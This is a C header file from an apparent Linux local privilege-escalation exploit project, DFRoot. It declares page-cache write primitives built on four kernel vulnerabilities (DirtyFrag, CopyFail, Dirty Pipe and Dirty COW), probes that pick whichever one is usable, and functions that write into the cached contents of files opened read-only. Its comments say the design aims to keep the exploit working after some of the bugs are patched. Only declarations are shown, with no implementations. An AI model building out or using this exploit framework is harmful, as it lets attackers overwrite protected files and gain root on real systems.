/* Page-cache write primitives.
 *
 * DFRoot originally depended on one bug: the XFRM/ESP in-place decrypt
 * (CVE-2026-43284, "DirtyFrag"). These primitives add independent ways to
 * reach the same place a file's page cache so the exploit keeps working when
 * the ESP path is fixed but another page-cache bug is still open.
 *
 * Every primitive mutates page cache through a legitimately opened fd. It
 * never touches disk bytes until the page is evicted, which is exactly what
 * DFRoot wants: the patched bytes are consumed from cache.
 */
#ifndef DFR_PAGECACHE_H
#define DFR_PAGECACHE_H

#include <stddef.h>
#include <stdint.h>
#include <sys/types.h>

enum pcw_prim {
    PCW_XFRM = 0,   /* CVE-2026-43284 DirtyFrag, existing path */
    PCW_COPYFAIL,   /* CVE-2026-31431 CopyFail */
    PCW_DIRTYPIPE,  /* CVE-2022-0847 Dirty Pipe */
    PCW_DIRTYCOW,   /* CVE-2016-5195 Dirty COW, kernel 4.x and older */
    PCW_PRIM_MAX,
};

const char *pcw_prim_name(int prim);
const char *pcw_prim_cve(int prim);

/* Returns 0 when the primitive looks usable on this kernel, -1 otherwise.
 * Probes are read-only: they create a socket or read uname, never write. */
int pcw_copyfail_probe(void);
int pcw_dirtypipe_probe(void);
int pcw_dirtycow_probe(void);

/* Write len bytes into the page cache backing fd at off.
 * fd may be O_RDONLY. Returns 0 only after a pread() of the range matches. */
int pcw_copyfail_write_fd(int fd, off_t off, const void *data, size_t len);
int pcw_dirtypipe_write_fd(int fd, off_t off, const void *data, size_t len);
int pcw_dirtycow_write_fd(int fd, off_t off, const void *data, size_t len);

/* Release cached AF_ALG state. Safe to call more than once. */
void pcw_copyfail_close(void);

#endif
